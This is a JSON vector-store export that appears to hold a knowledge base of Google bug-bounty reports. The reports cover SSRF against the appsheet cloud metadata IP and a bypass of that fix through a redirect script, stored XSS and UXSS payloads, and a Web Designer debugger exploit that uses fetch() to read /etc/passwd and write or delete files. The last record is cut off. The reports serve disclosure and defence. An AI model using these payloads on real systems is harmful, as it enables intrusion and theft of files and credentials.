"93923ab7-93bc-4809-b0e4-034a53c34e81": {"__data__": {"id_": "93923ab7-93bc-4809-b0e4-034a53c34e81", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_617451.clean.txt", "file_name": "20250408_175712_617451.clean.txt", "file_type": "text/plain", "file_size": 3931, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "5086b18d-1583-4ce3-a7fe-c5046582df5f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_617451.clean.txt", "file_name": "20250408_175712_617451.clean.txt", "file_type": "text/plain", "file_size": 3931, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "8f88541c4a42de3cc3455ddbf64bd91da81286eebb20ea52c389724e4d4103da", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nCEF Debugger Enabled in Google Web Designer\r\nProduct:\r\nGoogle Web Designer\r\nVulnerability type:\r\nPrivilege Escalation\r\nDetails\r\nDescription\r\nGoogle Web Designer is built compiled with the GEF debugger enabled.\r\nThis configuration exposes a local TCP port which (which is typically randomized across executions) where a minimal frontend and a WebSocket server are available.\r\nBy connecting to it, it is possible to run arbitrary JavaScript code inside the context of the target application (Google Web Designer).\r\nA general description of the vulnerability was very well documented by your very own Taviso here;\r\nhttps://github.com/taviso/cefdebug\r\nAttack scenario\r\nAttack Vector\r\nAs the GEF version is pretty recent and the\r\n/json/new\r\nAPI is not enabled and a DNS rebinding attack is not possible.\r\nThe only working attack vector is the the local one.\r\nIt means that the attacker must have a local shell on the victim's device as any user (this means it's very useful for privilege escalations).\r\nImpact\r\nAn attacker could:\r\nSteal the Google account refresh token (if the victim is logged in the Google Web Designer client).\r\nRead / Write / Delete / List any file and folder the victim system user has access to. This is possible as Google Web Designer implements some special APIs which are triggered when you fetch a\r\nhttps://ninja-shell/api/{file|directory}?method={read|create|save|delete|exists|...}&{file|path}=\r\nURL.\r\nProof of Concept\r\nRequirements:\r\nHave a computer with 2 different system accounts (i.e. lowpriv and regularuser)\r\nSteps to Reproduce:\r\nInstall the Google Web Designer client with\r\nregularuser\r\nOpen the Google Web Designer client with\r\nLogin with your Google Account\r\nOpen session as\r\nlowpriv\r\nwithout logging out from\r\nor closing the Google Web Designer client\r\nList the running processes (i.e. by running\r\nps auxw\r\n) and notice that the Google Web Designer is executed with the\r\n--remote-debugging-port\r\nflag, specifying a port (i.e.\r\n/Volumes/Google Web Designer/Google Web Designer.app/Contents/Frameworks/Google Web Designer Helper (Renderer).app/Contents/MacOS/Google Web Designer Helper (Renderer) --type=renderer --log-file=/Users/smaury/Library/Logs/Google Web Designer_debug.log --remote-debugging-port=65423 --field-trial-handle=1718379636,3111382051732477566,9981932134914610433,131072 --enable-features=CastMediaRouteProvider --lang=en --log-file=/Users/smaury/Library/Logs/Google Web Designer_debug.log --log-severity=disable --disable-spell-checking --uncaught-exception-stack-size=20 --num-raster-threads=4 --enable-zero-copy --enable-gpu-memory-buffer-compositor-resources --enable-main-frame-before-activation --renderer-client-id=5 --no-v8-untrusted-code-mitigations --shared-files --seatbelt-client=44\r\n)\r\nOpen a browser pointing to\r\nhttp://localhost\r\n:<port> where\r\n<port>\r\nis the one observed in the previous step\r\nClick on \"Google Web Designer\"\r\nIn the Console tab paste the following code:\r\nfetch(\"https://ninja-shell/api/file?method=read&file=%2Fetc%2fpasswd\").then(response => response.text()).then(data => console.log(data));\r\nNotice that the content of the file\r\n/etc/passwd\r\nis shown\r\nIn the Console tab paste the following code\r\nfetch(\"https://ninja-shell/api/file?method=delete&file=%2Ftmp/test\", {\r\n\"headers\": {\r\n\"content-type\": \"application/x-www-form-urlencoded;charset=UTF-8\"\r\n},\r\n\"referrer\": \"https://prodc.webdesignerauth.withgoogle.com/?livestream=0\",\r\n\"referrerPolicy\": \"no-referrer-when-downgrade\",\r\n\"body\": \"AAAA\",\r\n\"method\": \"PUT\",\r\n\"mode\": \"cors\",\r\n\"credentials\": \"omit\"\r\n});\r\nfetch(\"https://ninja-shell/api/file?method=create&file=%2Ftmp/test\", {\r\nNotice that the file\r\n/tmp/test\r\nis deleted and then re-created with\r\nAAAA\r\nas content\r\nThe file creation/edit ability is very important as it could be used to elevate the privileges from\r\nto\r\nby adding an SSH key or a cronjob or some code in the dotfiles (\r\n.bashrc\r\n,\r\n.bash_profile\r\n, etc.) file of\r\n.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3931, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "3375fd3c-c6b3-49ce-9b8f-f00ff8275388": {"__data__": {"id_": "3375fd3c-c6b3-49ce-9b8f-f00ff8275388", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_806225.clean.txt", "file_name": "20250408_175712_806225.clean.txt", "file_type": "text/plain", "file_size": 2371, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b0d97fa8-9fb1-4362-9329-f8fc3633a0dd", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_806225.clean.txt", "file_name": "20250408_175712_806225.clean.txt", "file_type": "text/plain", "file_size": 2371, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "be0c522a8dac9a9f363529d5d114cf74a4c63cd0c7443c5dea5adc075f09d865", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nServer side request forgery in Adding apigee account sources in appsheet.com, This endpoint allow us to add an apikey of apigee and api url and it will make http request to that third party url .\r\nProduct:\r\nappsheet.com\r\nURL:\r\nhttps://www.appsheet.com/Account/ApigeeAuthInfo?state=8d8254a0-f6fc-4ee9-9895-28b77c9869b6#openapi\r\nVulnerability type:\r\nInformation Leak\r\nDetails\r\nDescription\r\n: Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.\r\nIn a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.\r\nBut here we as an attacker able to extract partial google cloud metadata and able to make requests for internal resources\r\nSteps to reproduce\r\n:\r\n1.Login to your account in appsheet.com .\r\n2.Navigate to my account section & click on new data source.\r\n3.Now select apigee and select Authorization Type as apikey.\r\n4.Now add any random words in apikey.\r\n5.Enter your burp collaborator address in OpenAPI Spec URL and click on validate .\r\n6.Now you can see in the response its rendered that burp collaborator url and made request for that url.\r\n7.Now add google cloud metadata url in OpenAPI Spec URL(Because this website is hosted on google cloud)\r\ni.e\r\nhttp://169.254.169.254\r\nBy clicking on validate you can able to see that metadata version folder and computemetadata folder in response error.\r\nProof of concept\r\n: Check the below google drive link\r\nhttps://drive.google.com/file/d/12LQoOk12Zgg3hKOxGFsrdVYu2qEGF6Fd/view?usp=sharing\r\nAttack scenario\r\nImpact\r\n: As of now as an attacker I cant able to extract full metadata of google cloud due to some restrictions(Like public access preventions may be) but if Any attacker find the way to bypass the restrictions he will easily get access to very sensitive information about appsheet & any attacker can make request to internal resources.\r\nPlanned disclosure date:\r\nFri Dec 31 2021 00:00:00 GMT+0530 (India Standard Time)\r\nReporter would like to donate a possible VRP reward to charity.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2371, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "6981a4c4-e8d6-463f-a07c-821795cd5f36": {"__data__": {"id_": "6981a4c4-e8d6-463f-a07c-821795cd5f36", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_297762.clean.txt", "file_name": "20250408_175717_297762.clean.txt", "file_type": "text/plain", "file_size": 1051, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "dd3dbb0c-1adc-48d9-9831-5eb2dee8390c", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_297762.clean.txt", "file_name": "20250408_175717_297762.clean.txt", "file_type": "text/plain", "file_size": 1051, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "409be163db454bb46eb11d04bf3c923fab03901fbd440bc6028c372f8c359c11", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Stored Cross site scripting on\r\nhttps://kaggle.com\r\nDescription:\r\nStored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS.\r\nNote:\r\nThe content security policy is blocking my payload. By dissabling the content security policy in firefox i was able to get popup. To disable csp in firefox go to about:config and type security.csp.enable and select option to disable\r\nSteps to Reproduce:\r\nSignup to\r\nCreate dataset and go to discussion\r\nPut your payload in the disscussion\r\n($$ \\unicode{<img src=1 onerror=alert(document.cookie)//} $$)\r\nThe content Security policy is blocking the xss payload but it is vulnerable to xss\r\nImpact:\r\nAttacker would be able to steal cookie and perform malicious things.\r\nAcquisition info:\r\nIt was aquired in 08 Mar 2017 kaggle", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1051, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "b6526c3a-3994-4103-8d5e-57c0cd9b231b": {"__data__": {"id_": "b6526c3a-3994-4103-8d5e-57c0cd9b231b", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175730_979419.clean.txt", "file_name": "20250408_175730_979419.clean.txt", "file_type": "text/plain", "file_size": 1436, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "fba510bf-3047-4b02-bab7-5ab7e78ec96c", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175730_979419.clean.txt", "file_name": "20250408_175730_979419.clean.txt", "file_type": "text/plain", "file_size": 1436, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "dbf5244cfd7b7570405317fbc88881cc86ca7ab0d38d8eaf0a5188bb688dc969", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Some messages of restricted groups can be visible by using search feature of domain.\r\nGoogle group for a domain allows users to search content in groups or messages. By searching some text, the users is redirected to the url :\r\nhttps://groups.google.com/a/\r\n<domain>/forum/#!search/<text_to_search>.\r\nThis page displays all the visible messages matching the search request. However, I detected that some visible result cannot be accessible by directly navigating on it. (message or group which own the message).\r\nAn example among others, this url (\r\nhttps://groups.google.com/a/xm.com/forum/#!search/a%7Csort:date\r\n) allows \"anonymous users\" to see messages from \"HR GR\" or \"Chinese Coordinator\" group. By the way, the link of this group (\r\nhttps://groups.google.com/a/xm.com/forum/#!forum/hrgr\r\n) showed an error saying that i'm not authorized to see the group. I was able to see new messages coming to this group.\r\nThis behaviour appeared weeks ago on lot of public domain google groups. (\r\nhttps://groups.google.com/a/dennis.co.uk/forum/#!search/a\r\netc..) (I used to scan public groups as bug hunters).\r\nI was not able to explain this behaviour by a group privacy misconfiguration (searchable is not an option).\r\nSo i thought about kind of code regression this is why i posted that report.\r\nAttack scenario:\r\nAnonymous users can read the full message by made several search. (search of the last word of the visible extract).", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1436, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "edbcca9a-685c-436d-8a17-75620e80ca26": {"__data__": {"id_": "edbcca9a-685c-436d-8a17-75620e80ca26", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_795471.clean.txt", "file_name": "20250408_175728_795471.clean.txt", "file_type": "text/plain", "file_size": 991, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c4ad0626-b1fb-40f9-a83c-94a794bb23ce", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_795471.clean.txt", "file_name": "20250408_175728_795471.clean.txt", "file_type": "text/plain", "file_size": 991, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "db09c963779429a28ee19b2c9a445304feee53589c85504687489d80c917e41e", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Hii Google! I  found a vulnerability in google knowledge panel by which I can suggest an edit on behalf of the owner of the knowledge panel. If You Need More Help Or Video Then I am also ready for that.\r\nSteps to reproduce:\r\nGo To Your Own Knowledge Panel and Click On Suggest Edit\r\nNow Enter Your Suggestion and Before Clicking Send Intercept that request\r\nNow In The CID Field Change Your CID (Which is Followed by /g/ ) To The Attacker's CID\r\nNow We'll Observe That If A normal person send feedback to someone's knowledge panel then we'll get an email from -\r\nnoreply-ke-feedback@google.com\r\nBut If an Owner suggests edit then we got an email from -\r\nnoreply-feedback@google.com\r\nIn our case we are also getting an email from -\r\n, Even I am not the owner of that knowledge panel\r\nAttack scenario:\r\nA Regular User Can Make Edits To Celebrities Knowledge Panel\r\nAttacker Can disturb Googles' Search Information\r\nIt will ruin the reputation of google in terms of correct information", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 991, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "71161734-9db6-4398-9a4f-7177225bba60": {"__data__": {"id_": "71161734-9db6-4398-9a4f-7177225bba60", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_874805.clean.txt", "file_name": "20250408_175728_874805.clean.txt", "file_type": "text/plain", "file_size": 1877, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "3ff6a2e0-063b-4e2e-94a3-d80fa47a129b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_874805.clean.txt", "file_name": "20250408_175728_874805.clean.txt", "file_type": "text/plain", "file_size": 1877, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "a7bd6e8ce077abcb1a60866b0daa5dcad7568a1358869a7015ff44e0371b96c7", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: UXSS using User-Agent Switcher for Chrome\r\nSteps to reproduce:\r\nInstall\r\nhttps://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg/related\r\nGo to any web page (e.g. shhnjk.com) and open devtools\r\nChange JS context to User-Agent Switcher's content script and run\r\nchrome.extension.sendRequest({action: \"add_ua\", name: 'Edge', user_agent: \"Edge'+alert(origin)+'\", append_to_default_ua: true, indicator: 'Edge'})\r\nNow changes user agent to Default -> Edge\r\nGo to google.com and observe an alert\r\nBrowser/OS: Chrome/Windows 10\r\nAttack scenario:\r\nCompromised renderer can call content script APIs. There is a message listener in background script, and it allows setting arbitrary User Agent string.\r\nelse if (request.action == \"add_ua\") {\r\naddCustomUAOption(request.name, request.user_agent, request.append_to_default_ua, request.indicator);\r\nsendResponse({\r\nresult: \"success\"\r\n});\r\n}\r\nWhen this new user agent is set, content script injected in <all_urls> will overwrite navigator.userAgent using followinf script.\r\nvar a = document.createElement(\"script\");\r\na.type = \"text/javascript\";\r\na.innerText += \"Object.defineProperty(window.navigator, 'userAgent', { get: function(){ return '\" + (b.append_to_default_ua ? navigator.userAgent + ' ' + b.ua_string : b.ua_string) + \"'; } });\";\r\na.innerText += \"Object.defineProperty(window.navigator, 'vendor', { get: function(){ return '\" + (b.vendor) + \"'; } });\";\r\nif (b.platform) {\r\na.innerText += \"Object.defineProperty(window.navigator, 'platform', { get: function(){ return '\" + (b.platform) + \"'; } });\";\r\ndocument.documentElement.insertBefore(a, document.documentElement.firstChild)\r\nXSS everywhere. When any website tries to call navigator.userAgent, new overwritten function will be called. And since many websites calls navigator.userAgent to detect user agent, this is an UXSS.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1877, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "7e612922-c0e6-4e4b-a37c-25c0fa1bd259": {"__data__": {"id_": "7e612922-c0e6-4e4b-a37c-25c0fa1bd259", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_191160.clean.txt", "file_name": "20250408_175638_191160.clean.txt", "file_type": "text/plain", "file_size": 1452, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "64f0b225-6457-4c2d-a66e-766a3cc6bbe6", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_191160.clean.txt", "file_name": "20250408_175638_191160.clean.txt", "file_type": "text/plain", "file_size": 1452, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "2f42be3e260a0ace847b73c6378906ed5459dea32007b10d57a8f064164eeed7", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: BAC leads to have full access to the workspace with full Privileges even on removing the access via owner workspace\r\nDescription :\r\nHii Team hope you are doing well , while researching on (\r\nhttps://idx.google.com/\r\n) , i was exploring the feature related to the access management where  the owner can share there workspace to anyone via link the perspective user then can perform functions is workspace .\r\nBug:\r\nSo the bug is when the owner remove the access of the perspective user , but the user still have maintaned session of the workspace can perform functions in workspace leading to the full access to the workspace of the owner even on removng the access via owner itslef .\r\nSteps:\r\nNavigate to (\r\n)\r\ncreate a workspace/project .\r\nShare the access via feature on the top right handside , enter the mail you want to give access too.\r\nNow via perspective of the user open the workspace link and try editing the README file for poc .\r\nNow remove the access from the owner .\r\nYou will see that the user still have access to the project and can perform functions like CRUD.\r\n& it is lively updated in the owner's workspace .\r\nPoc:\r\nIf you want the poc , please let me know , i'll create one and will share with you.\r\nThanks\r\nAttack scenario:\r\nAs an attacker he/she easily make changes to the projects as they have CRUD privileges of the project . Without knowing the owner as the owner will think they have succesfully removed the access .", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1452, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "6f5cc130-37e1-4079-873d-25d761e2a73a": {"__data__": {"id_": "6f5cc130-37e1-4079-873d-25d761e2a73a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_329027.clean.txt", "file_name": "20250408_175717_329027.clean.txt", "file_type": "text/plain", "file_size": 983, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "32a84492-20ca-4031-8647-8cb98bdfce01", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_329027.clean.txt", "file_name": "20250408_175717_329027.clean.txt", "file_type": "text/plain", "file_size": 983, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "c4869b4fcdabca9631a686dc91dec2c957809b98f308ad895af4c9f621f64da7", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Exif Geolocation data not stripped from images in community section in support.google.com\r\nSteps to reproduce:\r\nGo to\r\nhttps://support.google.com/\r\n> communities > ask now section\r\nEnter the details\r\nUpload this  image from drive \"\r\nhttps://drive.google.com/file/d/1UNXdXH-U3bOFfTsQqexuZgrH3J3tMBu3/view?usp=sharing\"\r\nin details and post section in ask now\r\nAfter uploading the image click on continue and post the thread to the community\r\nAfter post is uploaded to the community right click on the image and select copy the image link\r\nhttp://exif.regex.info/\r\nand paste the image link in url and click on view image metadata\r\nThere you can able to see geolocation, camera model and a lot more information\r\nBrowser/OS:\r\nMicrosoft Edge\r\nAttack scenario:\r\nExample,\r\nAs the image is publicly available in community anyone can exploit this vulnerability by seeing the metadata of image uploaded and can gain the information like geolocation camera model and name and much more.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 983, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "d935ed0e-808e-4dac-8c78-e596aa277c26": {"__data__": {"id_": "d935ed0e-808e-4dac-8c78-e596aa277c26", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_369037.clean.txt", "file_name": "20250408_175647_369037.clean.txt", "file_type": "text/plain", "file_size": 2314, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "16664d19-ba96-4e43-a461-54c27917a287", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_369037.clean.txt", "file_name": "20250408_175647_369037.clean.txt", "file_type": "text/plain", "file_size": 2314, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "c2b3cdedbbc2522e38731dc6077c39e41eeee347dbc7b031d2b2f60cb2574267", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nFirestore private key leaked by using JSON.stringify on any firestore object in Node.JS\r\nProduct:\r\nFirebase\r\nURL:\r\nhttps://github.com/googleapis/nodejs-firestore/pull/1742\r\nVulnerability type:\r\nunknown\r\nDetails\r\n[ The bug has been fixed via my pull request, I just want a CVE ID for the fixed vulnerability ] and any bug bounty reward if eligible,\r\nPR :\r\nI discovered that when i serialise any firebase admin sdk nodejs-> firestore object, it was leaking the entire private key that i was using to initialise the SDK\r\n(\r\nhttps://firebase.google.com/docs/reference/admin/node/firebase-admin.app#example_2\r\n)\r\nthis was happening because of the non-protection of settings field inside firestore object, and this firestore object is present inside all other objects like documents, collections, references, etc\r\nEg: If we are logging the objects in our codebase for debugging using JSON.stringify the prod firebase project logs will contain the serialised firestore objects revealing the private key in logs like Google Cloud StackDriver logging, which is unintended as the person having logging view rights might not be authorised or intended to have access to prod firestore private key\r\nUpon my suggestion the bug is fixed and PR is merged, i would like a CVE ID number for this vulnerability i helped to fix and also any bug bounty reward if eligible.\r\nAttack scenario\r\nIt can be exploited by anybody who can see the output of serialization of firestore obejcts, For Example, Any developers in an organisation who have Google Cloud Stackdriver logs view only rights, so suppose if the code serialises any firestore objects for debugging ( document id, collection path , etc) the logs will also contain private key used to manually initialise firestore as described in this example\r\nand they will be able to see prod firebase firestore key which the organisation or project owners might not be wanting to for security reasons. Also prod key of any database should never be revealed by any serialisation technique on any database , library or ORM generated objects as the code may be passing credentials via env or some secret manager and the serialised data on database objects may be stored inside database to be shown to user or be put inside logs ( so that developers can see and debug any prod issues)", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2314, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "a83345e6-688e-4178-b6c9-dc78ce8bab9b": {"__data__": {"id_": "a83345e6-688e-4178-b6c9-dc78ce8bab9b", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_181365.clean.txt", "file_name": "20250408_175708_181365.clean.txt", "file_type": "text/plain", "file_size": 2991, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "5554a626-9d0a-4727-bef4-2b73a53129ad", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_181365.clean.txt", "file_name": "20250408_175708_181365.clean.txt", "file_type": "text/plain", "file_size": 2991, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "dc4784de9f465e2c1b5afd88007c1b8089d1701be59ebc945abf4ce2e0488f30", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nServer side request forgery fix bypass for report 208732630\r\nProduct:\r\nappsheet.com\r\nURL:\r\nhttps://www.appsheet.com/Account/ApigeeAuthInfo\r\nVulnerability type:\r\nInformation Leak\r\nDetails\r\nHi team,\r\nHope everything going fine on your side, I have found an bypass for report\r\nhttps://issuetracker.google.com/issues/208732630\r\nVulnerability\r\n: SSRF Fix Bypass for report 208732630\r\nDescription\r\n: Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.\r\nIn a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.\r\nAffected URL\r\n:\r\nType of Bypass\r\n: Using url redirection technique\r\nSteps to reproduce\r\nNavigate to appsheet.com & login using google Oauth\r\nNow navigate to My account --> Data sources --> new data source --> select apigee\r\nHere if we enter any url in 'OpenAPI Spec URL' it will fetch it from server side and displays the output for frontend\r\nNow if I tried to fetch localhost or 127.0.0.1 it says url not allowed(because its blacklisted).\r\nNow these filters can be bypassed using redirection technique.\r\nexample here is my server i.e attacker server\r\nhttps://basubanakar.com\r\nhere I have an php code that requires get parameter url as input and it will redirect users to that url\r\nhere is a code of getredir.php\r\n<?php\r\n$redir = $_GET['url'];\r\nheader(\"Location: $redir\");\r\n?>\r\nfor example if I navigate to\r\nhttps://www.basubanakar.com/getredir.php?url=http://localhost\r\nThis above request will redirect me to\r\nhttp://localhost\r\nNow will add the above url in 'OpenAPI Spec URL' i.e\r\nNow this request will make redirection on server side of appsheet and that will automatically redirects to localhost\r\nBy using FFUF I have automated the process to find the other webservices running on other ports of localhost.\r\nhttps://www.basubanakar.com/getredir.php?url=http://localhost:80\r\nhttps://www.basubanakar.com/getredir.php?url=http://localhost:20202\r\nI have found two webservices running on two ports of localhost 80,20202\r\n80- serves the same webpage of appsheet\r\n20202- serves the 'Fluent bit prometheus exporter'\r\nProof of concept\r\n: check the below video\r\nhttps://drive.google.com/file/d/1N7dIuBFbv3vkAFHY5al6FPtvP_wvUMb9/view?usp=sharing\r\nRoot cause\r\n: because the redirection is found on server side of appsheet, and also the post redirected url is not validated .\r\nThanks & Regards,\r\nBasavaraj.\r\nAttack scenario\r\nHere anybody can exploit the vulnerability and they can gain access to any internal web services running on localhost and also other internal hosts to and one more main thing is as an attacker they are able brute force the internal webservers by using this technique", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2991, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": 